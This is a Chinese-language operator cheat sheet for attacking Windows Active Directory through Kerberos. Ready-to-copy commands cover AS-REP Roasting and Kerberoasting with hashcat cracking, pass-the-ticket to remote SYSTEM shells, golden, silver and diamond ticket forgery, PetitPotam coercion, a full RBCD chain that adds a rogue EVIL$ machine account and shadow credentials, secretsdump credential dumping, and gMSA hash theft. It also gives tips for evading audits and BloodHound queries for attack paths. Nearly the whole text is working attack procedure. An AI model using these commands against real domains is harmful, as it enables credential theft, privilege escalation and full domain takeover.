# Kerberos 深度利用

围绕 Windows 域认证协议 Kerberos 的完整攻击面:环境准备、AS-REP Roasting、Kerberoasting、票据传递、黄金/白银/钻石票据伪造、三种委托攻击(RBCD 全链)与 gMSA 密码读取。本文件命令均可直接复制,占位符用尖括号标注(如 `<域>`(如 test.local)、`<域控IP>`、`<用户>`、`<哈希>` 为 `LM:NT` 格式,LM 留空写 `:NT`)。

本文件工具:krb5-user(kinit/klist)、chrony、impacket 套件、netexec(nxc)、certipy、hashcat、pywhisker、gMSADumper、PetitPotam、mimikatz(目标机侧)

---

## Kerberos 环境准备 — 时间同步、krb5.conf 与票据缓存

来源:Kali 预装 `chrony`(/usr/sbin/chronyd)与 `krb5-user`(kinit/klist/kdestroy)

### 时间同步(Kerberos 前置,偏差 >5 分钟必失败)

```bash
sudo chronyd -q 'server <域控IP> iburst'    # 与域控单次强制对时,完成即退出;报 Clock skew too great 就先跑这条
date                                        # 确认本机时间已与域控一致
```

### /etc/krb5.conf 配置(示例域 test.local,按实际替换)

```bash
sudo tee /etc/krb5.conf <<'EOF'
[libdefaults]
    default_realm = TEST.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    TEST.LOCAL = {
        kdc = dc01.test.local
        admin_server = dc01.test.local
    }

[domain_realm]
    .test.local = TEST.LOCAL
    test.local = TEST.LOCAL
EOF
echo '<域控IP>  dc01.test.local' | sudo tee -a /etc/hosts    # /etc/hosts 加域控 FQDN 映射;-k 命令按主机名解析,必加
```

### kinit / klist / kdestroy / KRB5CCNAME

```bash
kinit <用户>@TEST.LOCAL                 # 输密码获取 TGT;REALM 必须**全大写**(即 <域> 转大写,如 kinit administrator@TEST.LOCAL)
klist                                   # 查看当前缓存票据:主体、有效期、会话密钥类型
kdestroy                                # 清空默认票据缓存
export KRB5CCNAME=/path/to/<票据>.ccache   # 指定后续所有 -k 命令使用的票据文件(ccache 格式)
klist -c $KRB5CCNAME                    # 查看指定票据文件内容
```

参数速查:

- `chronyd -q 'server <IP> iburst'`:一次性对时(-q 同步完退出,不常驻)
- krb5.conf:REALM 全大写;`kdc`/`admin_server` 写域控 FQDN(多域控写多行 kdc);`rdns = false` 防反向解析错位
- `kinit <用户>@<大写REALM>`:获取 TGT;`klist` 查看票据;`kdestroy` 销毁
- `KRB5CCNAME=<文件>`:票据文件环境变量,impacket/nxc 所有 `-k` 命令都读它;临时用法写命令前缀 `KRB5CCNAME=xxx.ccache <命令>` 不污染全局

注意: 一切 `Clock skew too great` / `KRB_AP_ERR_SKEW` 先查时间;`kinit` 报 `Cannot contact any KDC` 先查 krb5.conf 的 kdc 与 /etc/hosts 映射;AS/TGS 报 `KDC_ERR_PREAUTH_FAILED` 是密码错,不是环境问题。

## impacket-GetNPUsers / nxc --asreproast — AS-REP Roasting(离线爆"免预认证"账户)

来源:apt 包 `python3-impacket`(/usr/bin/impacket-GetNPUsers)、`netexec`(/usr/bin/nxc)

```bash
# 有任意有效域凭据:LDAP 枚举"不需要 Kerberos 预认证"的账户并直接请求其 TGT
impacket-GetNPUsers '<域>/<用户>:<密码>' -dc-ip <域控IP> -request -format hashcat -outputfile asrep.txt
# 无任何凭据:只要用户名字典,逐个发 AS-REQ 试探(免密探测)
impacket-GetNPUsers '<域>/' -dc-ip <域控IP> -usersfile users.txt -format hashcat -outputfile asrep.txt
# netexec 一步:枚举+抓取写文件(需有效域凭据)
nxc ldap <域控IP> -u <用户> -p <密码> --asreproast asrep.txt
# 破解:etype 23(RC4)用 18200
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule -O
```

参数速查:

- `-request`:实际请求 TGT 并按破解格式输出(默认只枚举账户)
- `-usersfile <文件>`:用户名列表(每行一个),配合空身份做免密探测
- `-format hashcat|john`:输出格式,默认 hashcat
- `-outputfile <文件>`:哈希落盘
- nxc `--asreproast <文件>`:枚举+抓取一步到位
- hashcat 模式:`18200`(etype 23/RC4)、`32200`(etype 18/AES-256)、`32100`(etype 17/AES-128)

注意: 目标是勾选了"账户不需要 Kerberos 预认证"(DontReqPreauth)的账户,枚举不到属正常,别反复重试;AES(32200/32100)比 RC4 慢数个量级,优先挑 `$krb5asrep$23$` 开头的 RC4 行破;破出口令后接 `kinit`/`impacket-getTGT` 直接拿票据。

## impacket-GetUserSPNs / nxc --kerberoasting — Kerberoasting(离线爆服务账户口令)

来源:apt 包 `python3-impacket`(/usr/bin/impacket-GetUserSPNs)、`netexec`(/usr/bin/nxc)

```bash
# 全量:请求所有"用户账户注册 SPN"的 TGS,输出可破解哈希
impacket-GetUserSPNs -request -dc-ip <域控IP> '<域>/<用户>:<密码>' -outputfile tgs.txt
# 只打指定账户,动静最小(-request-user 只写用户名不带域)
impacket-GetUserSPNs -request -request-user <SPN账户> -dc-ip <域控IP> '<域>/<用户>:<密码>' -outputfile tgs.txt
# netexec 版:一步枚举+抓取
nxc ldap <域控IP> -u <用户> -p <密码> --kerberoasting tgs.txt
nxc ldap <域控IP> -u <用户> -p <密码> --kerberoasting tgs.txt --kerberoast-account <SPN账户>   # 只打指定账户
# 破解:etype 23(RC4)用 13100
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -O
```

### Rubeus 替代说明(本机仅有源码,用 mimikatz 等价)

来源:`~/tools/windows/Rubeus.exe` **已本机编译**(2026-09-17,dotnet6 SDK 移植 net472,PE+功能串实证;microsoft 官方无预编译故自编);Windows 目标机票据瑞士军刀,或用 mimikatz kerberos:: 模块等价

```bash
# 目标 Windows 机上(等价 Rubeus 的票据枚举/导出):
mimikatz.exe "kerberos::list /export" exit        # 导出当前会话全部票据为 .kirbi 文件(当前目录)
# .kirbi 拷回 Linux 转成 ccache,交给 impacket 系工具:
impacket-ticketConverter <票据>@0.kirbi <票据>.ccache
export KRB5CCNAME=<票据>.ccache
```

参数速查:

- `-request`:请求 TGS(默认只枚举 SPN 列表)
- `-request-user <账户>` / `-request-machine <机器名$>`:只打指定用户 SPN / 机器账户 SPN
- `-machine-only`:只枚举机器账户 SPN(密码通常随机,价值低,仅补全枚举用)
- `-outputfile <文件>`:哈希落盘(自动启用 -request)
- nxc `--kerberoasting <文件>` / `--kerberoast-account <账户>`
- hashcat 模式:`13100`(etype 23/RC4)、`19700`(etype 18/AES-256)、`19600`(etype 17/AES-128)

注意: 破出来的是 **SPN 服务账户**的口令,优先打 MSSQL/IIS/备份/运维类服务账户(密码强度低、权限高);`kerberos::list /export` 在普通用户会话只能导出本人票据,SYSTEM 上下文最全;ticketConverter 双向可用(ccache ↔ kirbi)。

## impacket-getTGT / describeTicket / KRB5CCNAME — 票据获取、检视与传递

来源:apt 包 `python3-impacket`(/usr/bin/impacket-getTGT、impacket-describeTicket、impacket-ticketConverter)

```bash
# 请求 TGT:密码 / NT 哈希 / AES 密钥三种姿势(产物均为 <用户>.ccache)
impacket-getTGT '<域>/<用户>:<密码>' -dc-ip <域控IP>
impacket-getTGT '<域>/<用户>' -hashes :<NT哈希> -dc-ip <域控IP>      # 传递哈希取票据
impacket-getTGT '<域>/<用户>' -aesKey <AES密钥> -dc-ip <域控IP>      # AES 密钥(域禁 RC4 时必用)
# 票据检视:解析主体/组/加密类型/有效期/PAC;给 krbtgt 密钥可解出完整 enc-part
impacket-describeTicket <用户>.ccache
impacket-describeTicket <用户>.ccache --rc4 <krbtgt的NT哈希>        # 解密 TGT 内容看 PAC 明细
```

### 票据传递(Pass-the-Ticket)

```bash
export KRB5CCNAME=administrator.ccache       # 指定票据文件
klist                                        # 确认票据加载成功
nxc smb <目标主机名>.<域> -k --use-kcache --shares        # nxc 走 ccache 票据验证并枚举共享
KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass <目标主机名>.<域>    # 半交互 SYSTEM shell
KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass <目标主机名>.<域>   # WMI shell(不落盘)
impacket-ticketConverter <票据>.ccache <票据>.kirbi       # ccache ↔ kirbi 互转(喂给 Windows 侧工具)
```

参数速查:

- getTGT `-hashes :<NT哈希>` / `-aesKey <密钥>` / `-dc-ip <IP>`:身份与定位参数
- describeTicket `--rc4` / `--aes` / `-p -u -d`:提供对应服务账户密钥解密票据 enc-part
- `-k`:所有 impacket 工具通用开关,走 Kerberos 认证(从 KRB5CCNAME 取票据)
- `-no-pass`:不提示输密码(与 -k 连用)
- nxc `-k` + `--use-kcache`:直接用 KRB5CCNAME 票据

注意: `-k` 连接时目标写 **FQDN 主机名而不是 IP**(Kerberos 按 SPN 匹配票据),且 /etc/hosts 必须能解析该主机名;多张票据切换用命令前缀 `KRB5CCNAME=xxx.ccache <命令>`,避免 export 污染后续操作;getST/ticketer 生成的票据同理通过 KRB5CCNAME 交接。

## impacket-ticketer — 黄金 / 白银 / 钻石票据伪造

来源:apt 包 `python3-impacket`(/usr/bin/impacket-ticketer、impacket-lookupsid、impacket-GetADUsers)

### 域 SID 获取(伪造前必拿)

```bash
impacket-lookupsid '<域>/<用户>:<密码>'@<域控IP> 0     # RID 填 0,输出行 "Domain SID is: S-1-5-21-...",即域 SID(去 RID)
nxc ldap <域控IP> -u <用户> -p <密码> --get-sid       # netexec 直接取域 SID(输出同样格式)
impacket-GetADUsers -all '<域>/<用户>:<密码>' -dc-ip <域控IP>   # 辅助:枚举域用户表(核对账户名与状态)
```

### 黄金票据(krbtgt 密钥伪造 TGT,全域通行)

```bash
impacket-ticketer -nthash <krbtgt的NT哈希> -domain-sid <域SID> -domain <域> administrator
impacket-ticketer -aesKey <krbtgt的AES256密钥> -domain-sid <域SID> -domain <域> administrator   # AES 版(域禁 RC4 用)
export KRB5CCNAME=administrator.ccache
KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass dc01.<域>    # 伪造票据直接上域控
```

### 白银票据(服务账户密钥伪造 TGS,只对单一 SPN)

```bash
impacket-ticketer -nthash <服务账户NT哈希> -domain-sid <域SID> -domain <域> -spn cifs/<目标主机名>.<域> administrator
export KRB5CCNAME=administrator.ccache
KRB5CCNAME=administrator.ccache impacket-smbclient -k -no-pass <目标主机名>.<域>
```

### 钻石票据(先请求真实 TGT,再用 krbtgt 密钥只改 PAC,结构合法度最高)

```bash
# 原理:用任意低权合法凭据真实请求一张 TGT(-request),再用 krbtgt 密钥克隆并改写 PAC——
# 票据结构来自 DC 本体,比纯离线伪造的黄金票据更难被检测
impacket-ticketer -request -user '<域>/<低权合法用户>:<密码>' -nthash <krbtgt的NT哈希> -domain-sid <域SID> -domain <域> administrator
```

### 四种票据对比

| 票据 | 所需密钥 | impacket 写法 | 适用面 |
|---|---|---|---|
| 黄金 TGT | krbtgt 的 NT/AES | `ticketer -nthash`(不带 -spn) | 全域任意服务 |
| 白银 TGS | 某服务账户密钥 | `ticketer -spn <SPN> -nthash` | 仅该 SPN,全程不碰 KDC |
| 钻石 | krbtgt 密钥 + 任意合法凭据 | `ticketer -request -user ...` | 同黄金,结构最像真实票据 |
| 蓝宝石(Sapphire) | krbtgt 密钥 + 可 S4U 账户 | `ticketer -impersonate <目标>` | 复制目标用户的真实 PAC/组信息 |

参数速查:

- `-domain-sid <域SID>` + `-domain <域>`:伪造必填两项
- `-nthash <哈希>` / `-aesKey <密钥>`:签名密钥(黄金/钻石=krbtgt,白银=服务账户)
- `-spn <SPN>`:指定则伪造白银,省略即黄金
- `-request`:克隆真实票据改 PAC(钻石);须配 `-user '<域>/<用户>:<密码>'`
- `-impersonate <用户>`:蓝宝石,通过 S4U2Self+U2U 取真实 PAC
- `-user-id <RID>`(默认 500)/ `-groups <RID列表>`(默认 512,513,518,519,520)/ `-extra-sid <SID列表>`:自定义 PAC 身份
- `-duration <小时>`:有效期(默认 10 年,实战建议压短)

注意: 黄金/钻石的前提是已拿到 krbtgt 哈希(DCSync 或 secretsdump -just-dc 之后,见 05 文档);白银票据不走 KDC、无日志,但服务账户改密即失效;黄金票据默认 10 年有效期在审计里非常显眼,记得 `-duration` 控制;getST 的 `-impersonate`/`-additional-ticket` 是在线 S4U 请求路径(见下节),与 ticketer 离线伪造互补。

## impacket-findDelegation — 委托关系发现与三种委托攻击(含 RBCD 全链)

来源:apt 包 `python3-impacket`(/usr/bin/impacket-findDelegation、impacket-getST、impacket-rbcd、impacket-dacledit、impacket-addcomputer)、`~/tools/src/PetitPotam`(本地源码)、certipy(pipx,~/.local/bin)、pywhisker(`~/tools/src/pywhisker`)

### 发现

```bash
impacket-findDelegation '<域>/<用户>:<密码>' -dc-ip <域控IP>     # 全域委托一览:账户/类型/委派到哪
nxc ldap <域控IP> -u <用户> -p <密码> --find-delegation         # netexec 版
nxc ldap <域控IP> -u <用户> -p <密码> --trusted-for-delegation  # 非约束委托主机清单(UD 主机)
impacket-rpcdump <域控IP> 2>/dev/null | grep -i rprn            # 有输出=域控 Spooler 开启(打印机 bug 可触发)
```

findDelegation 的 DelegationType 列读法:`Unconstrained`=非约束;`Constrained (w/ Protocol Transition)`=约束+协议转换(可直接 getST);`Constrained (w/o ...)`=仅 Kerberos 约束;`RBCD`=资源约束。

### 非约束委托(UD):诱骗特权账户认证到 UD 主机,收割其 TGT

```bash
# 触发域控主动连向 UD 主机:PetitPotam(MS-EFSR)强推;Spooler 开启时打印机 bug(MS-RPRN)同理可触发
python3 ~/tools/src/PetitPotam/petitpotam.py -d <域> -u <用户> -p <密码> <UD主机IP> <域控IP>
# DC 认证落到 UD 主机后,其 TGT 缓存进 LSASS —— 在 UD 主机(Windows)导出:
mimikatz.exe "sekurlsa::tickets /export" exit          # 导出全部缓存票据,找 DC$ 的 TGT(*.kirbi)
# DC 的 TGT 拷回 Linux 转格式,DC 机器账户可 DCSync:
impacket-ticketConverter <DC票据>.kirbi dc.ccache
KRB5CCNAME=dc.ccache impacket-secretsdump -k -no-pass dc01.<域>
```

### 约束委托(RBCD 除外):S4U2Self+S4U2Proxy 模拟管理员

```bash
# findDelegation 发现服务账户配置了约束委托(w/ 协议转换)到 cifs/<目标>:
impacket-getST -spn cifs/<目标主机名>.<域> -impersonate administrator -dc-ip <域控IP> '<域>/<委派服务账户>:<密码>'
export KRB5CCNAME=administrator.ccache
KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass <目标主机名>.<域>
# 一票多用:在票据里追加别名的 sname(须在 AllowedToDelegateTo 范围内)
impacket-getST -spn cifs/<目标主机名>.<域> -altservice host/<目标主机名>.<域> -impersonate administrator -dc-ip <域控IP> '<域>/<委派服务账户>:<密码>'
# "仅 Kerberos"约束(w/o 协议转换)绕过:CVE-2020-17049,强制 S4U2Self 可转发
impacket-getST -spn cifs/<目标主机名>.<域> -impersonate administrator -force-forwardable -dc-ip <域控IP> '<域>/<委派服务账户>:<密码>'
```

### RBCD 全链(影子凭据 + 委托,前提:对目标机器账户有 GenericWrite)

```bash
# ① 影子凭据:给目标机器账户挂"机器密钥"(写 msDS-KeyCredentialLink 属性)
python3 ~/tools/src/pywhisker/pywhisker/pywhisker.py -d <域> -u <用户> -p <密码> --dc-ip <域控IP> -t '<目标机器名>$' -a add -f target -e PFX -P '<PFX密码>'
# ② PKINIT 证书认证:certipy 输出目标机器账户的 NT 哈希(UnPAC-the-hash)并保存 TGT ccache
certipy auth -pfx target.pfx -password '<PFX密码>' -dc-ip <域控IP>
# ③ 建受控机器账户(普通用户默认 MachineAccountQuota=10 可自助建;已有账户可跳过)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass '<机器账户密码>' -dc-ip <域控IP> '<域>/<用户>:<密码>'
# ④ 写 RBCD 委派(两条等价路,二选一):
impacket-rbcd -action write -delegate-from 'EVIL$' -delegate-to '<目标机器名>$' -dc-ip <域控IP> '<域>/<用户>:<密码>'    # 专用工具直写 msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-dacledit -action write -rights FullControl -principal 'EVIL$' -target '<目标机器名>$' -dc-ip <域控IP> '<域>/<用户>:<密码>'   # 或给 EVIL$ 写全控 DACL(权限泛化,便于持久化)
# ⑤ S4U2Self+S4U2Proxy:以 EVIL$ 身份模拟 administrator 取目标机器服务票据
#    服务类型按用途:cifs(SMB/secretsdump)、host(计划任务/注册表)、http(WinRM)
impacket-getST -spn cifs/<目标机器名>.<域> -impersonate administrator -dc-ip <域控IP> '<域>/EVIL$:<机器账户密码>'
# ⑥ 传递票据,转储目标机本地凭据(SAM/LSA)
export KRB5CCNAME=administrator.ccache
KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass <目标机器名>.<域>
# 收尾:清掉挂上去的机器密钥(先用 -a list 查 device-id)
python3 ~/tools/src/pywhisker/pywhisker/pywhisker.py -d <域> -u <用户> -p <密码> --dc-ip <域控IP> -t '<目标机器名>$' -a remove -D <device-id>
```

参数速查(findDelegation | getST | rbcd/dacledit | pywhisker | addcomputer):

- findDelegation `-target-domain <域>`:跨信任域查委托;`-disabled` 连禁用账户一起查
- getST `-spn <SPN>`:目标服务;`-impersonate <用户>`:S4U2Self 模拟对象;`-altservice <SPN>`:票据内追加别名服务
- getST `-force-forwardable`:CVE-2020-17049;`-additional-ticket <ccache>`:S4U2Proxy 附加票据(RBCD+KCD 组合场景)
- getST 认证:`-hashes :<NT哈希>` / `-aesKey <密钥>`(机器账户用其哈希即可)
- impacket-rbcd `-action read|write|remove` `-delegate-from` `-delegate-to`:RBCD 属性专用读写
- dacledit `-action write -rights FullControl|GenericWrite 等价写法 -principal <受托账户> -target <目标账户>`;`-action read` 查看现有 DACL
- pywhisker `-t '<目标机器名>$' -a add|list|remove -D <device-id> -f <文件名> -e PEM|PFX`
- addcomputer `-computer-name 'EVIL$' -computer-pass '<密码>'`
- PetitPotam `<监听/落点IP> <目标IP>`:位置参数=让目标主动连谁、打谁

注意: ② 必须用 certipy auth——本机 impacket-getTGT(0.14.0.dev0)没有 PKINIT 参数,证书认证只有 certipy 这条路;RBCD 要求域功能级别 ≥2012、目标账户不属敏感组(受保护用户/DC 默认拒绝 S4U);`ntlmrelayx --delegate-access` 中继版拿到的 GenericWrite 同样接 ③④⑤⑥(见 05 文档);打完务必 remove 机器密钥并可用 `impacket-rbcd -action remove` 回滚。

## gMSADumper / nxc --gmsa — gMSA 托管服务账户密码读取

来源:本地源码 `~/tools/src/gMSADumper`(python3 直跑)、`netexec`(/usr/bin/nxc)、apt 包 `python3-impacket`

```bash
# 列出当前账户有权读取的全部 gMSA 账户 NT 哈希(-l 指域控)
python3 ~/tools/src/gMSADumper/gMSADumper.py -u <用户> -p <密码> -d <域> -l <域控IP>
# -p 也接受 LM:NT 哈希(传哈希读 gMSA)
python3 ~/tools/src/gMSADumper/gMSADumper.py -u <用户> -p :<NT哈希> -d <域> -l <域控IP>
# netexec 等价枚举:
nxc ldap <域控IP> -u <用户> -p <密码> --gmsa
# 拿到 svc_gmsa$ 的 NT 哈希后当普通账户直接用(密码永不下发,哈希即永久凭据):
nxc smb <目标IP> -u 'svc_gmsa$' -H <NT哈希> -d <域> --sam
impacket-getTGT '<域>/svc_gmsa$' -hashes :<NT哈希> -dc-ip <域控IP>    # gMSA 账户票据(常配置高权限委托)
```

参数速查:

- `-u <用户>` / `-p <密码或:NT哈希>` / `-d <域>` / `-l <域控IP>`:四件套;-l 也可写域名
- `-k`:Kerberos 认证(配合 KRB5CCNAME)
- nxc `--gmsa`:枚举并解密 gMSA 密码;`--gmsa-convert-id <账户>`:查 gMSA 的 secret 名
- hashcat(仅当需要离线爆破时):拿到的是纯 NT 哈希则 `-m 1000`;若是对 gMSA 账户 SPN 请求的 Kerberoast 哈希,则 `-m 13100`(etype 23/RC4)、`-m 19700`(etype 18/AES-256)、`-m 19600`(etype 17/AES-128),按哈希前缀 `$krb5tgs$<etype>$` 的数字选

注意: 前提是你的账户在该 gMSA"可读取密码"安全组(msDS-GroupMSAMembership)里——常见误配是把 Domain Admins/宽泛组加进去,BloodHound 可直接查;gMSA 的明文密码是 240 位随机字节数组,**离线爆破实战不可行,不要浪费时间跑 hashcat**,哈希直接传递使用才是正解;gMSA 账户常带高权限(跑服务/委派),拿到后优先接 findDelegation 查它配没配委托。

## 附录:BloodHound 自定义 Cypher 速查(CE 版可用)

来源:BloodHound CE 查询框(GUI 顶部查询输入框直接粘贴,逐条执行;本机 apt 包 bloodhound 9.7 即 CE 版,下述边名/属性已按其内置 schema 核实,如 AllowedToDelegate、AllowedToAct、WriteAccountRestrictions、ReadLAPSPassword、GPLink 等;SharpHound 收集与导入步骤见 05 文档 BloodHound 小节)

**① 非 DA 的 Kerberoastable 用户**

```bash
# 可 Kerberoast 但不在任何 highvalue 组(DA/EA 等)的账户——优先打 pwdlastset 越老的
MATCH (u:User {hasspn:true}) WHERE NOT (u)-[:MemberOf*1..]->(g:Group {highvalue:true}) RETURN u.name, u.serviceprincipalnames, u.pwdlastset
```

**② AS-REP Roastable(无需预认证)**

```bash
# 关了预认证的账户:GetNPUsers 可直接离线抓哈希(hashcat -m 18200);description 里常躺密码注释
MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.description
```

**③ 无约束委托(UD)机器**

```bash
# UD 机器会把认证过它的账户 TGT 缓存进 LSASS;DC 默认在列,重点看非 DC 条目(诱捕高权账户,接本文 PetitPotam 小节)
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name, c.operatingsystem
```

**④ 约束委托关系**

```bash
# n(用户或机器)可经 S4U 模拟任意用户访问 c 的服务——直接接 getST;协议转换与否再对照 findDelegation 输出(trustedtoauth)
MATCH p=(n)-[:AllowedToDelegate]->(c:Computer) RETURN p
```

**⑤ RBCD:现有配置 + 候选目标**

```bash
# 已配置的 RBCD:n 已可代表任意用户作用于 c(拿到了 n 就是直接入口)
MATCH p=(n)-[:AllowedToAct]->(c:Computer) RETURN p
# RBCD 候选:对机器账户有写类权限的主体可写 msDS-AllowedToActOnBehalfOfOtherIdentity——接本文 RBCD 全链小节
MATCH p=(n)-[:WriteAccountRestrictions|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(c:Computer) RETURN p
```

**⑥ 从立足账户出发的 DACL 滥用边**

```bash
# 你控制的账户对谁有写类权限:GenericAll 改密/加成员、WriteDacl 给自己提权、ForceChangePassword 重置密码、AddKeyCredentialLink 挂证书(影子凭据,接 certipy/pywhisker)
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AllExtendedRights|AddMember|AddKeyCredentialLink]->(m) WHERE toUpper(u.name) STARTS WITH toUpper('<当前用户>@') RETURN p
```

**⑦ DCSync 权限**

```bash
# 谁能 DCSync 整个域(DCSync 边是 CE 摄入时算好的派生边)
MATCH p=(n)-[:DCSync]->(d:Domain) RETURN p
# 等价判定:GetChanges + GetChangesAll 两条边同时持有即可 secretsdump -just-dc
MATCH (n)-[:GetChanges]->(d:Domain) WHERE (n)-[:GetChangesAll]->(d) RETURN n.name, d.name
```

**⑧ GPO 控制关系**

```bash
# 谁能改 GPO:改了 GPO(gpcpath 指向 SYSVOL)就能对它管辖的机器批量加本地管理员
MATCH p=(n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(g:GPO) RETURN p
# 第二跳看影响面:GPO 被链到哪些 OU(OU--GPLink-->GPO),OU 下 Contains 的机器全中招
MATCH p=(n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(g:GPO)<-[:GPLink]-(ou:OU) RETURN p
```

**⑨ LAPS 密码可读**

```bash
# 能读 LAPS 明文密码 = 拿到对应机器本地管理员;ReadLAPSPassword 为老 LAPS,SyncLAPSPassword 为 Windows LAPS 同步账户
MATCH p=(n)-[:ReadLAPSPassword|SyncLAPSPassword]->(c:Computer) RETURN p
```

**⑩ 最短路径到 DA(nopropagate 边过滤版)**

```bash
# 白名单只留"可传递控制"的边(成员/本地管理/各写权限/DCSync/委派),剔除 CanRDP/ExecuteDCOM/HasSession/SQLAdmin 这类"能到达但控制不往下传"的边(nopropagate 思路),链路更可信;起点钉死就把 (u:User) 改成 (u:User {name:'<用户名>@<域名>'})
MATCH p=shortestPath((u:User)-[:MemberOf|AdminTo|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AllExtendedRights|AddMember|AddKeyCredentialLink|DCSync|GetChanges|GetChangesAll|AllowedToDelegate|AllowedToAct*1..]->(g:Group)) WHERE toUpper(g.name) CONTAINS 'DOMAIN ADMINS' RETURN p
```

**⑪ 孤立的 adminCount=1**

```bash
# adminCount 标志还在(AdminSDHolder 保护、密码不随策略轮换)但已不在任何 highvalue 组——监控当特权账户防,实战却是低看守高价值目标
MATCH (u:User {admincount:true}) WHERE NOT (u)-[:MemberOf*1..]->(g:Group {highvalue:true}) RETURN u.name, u.pwdlastset
```

注意: CE 节点 name 统一是大写 `对象@域名` 格式,过滤条件一律 toUpper + CONTAINS 兜底;这些查询只读不写库,DCOnly 收集即可支撑大部分(GPO/GPLink、DACL、委托边都来自 LDAP,只有 HasSession 相关链路需要 Session 收集);查询返回空先核对收集器版本——老 SharpHound 3.x 产物缺 AllowedToAct/WriteAccountRestrictions 等 CE 边,需换 CE 配套收集器重收。
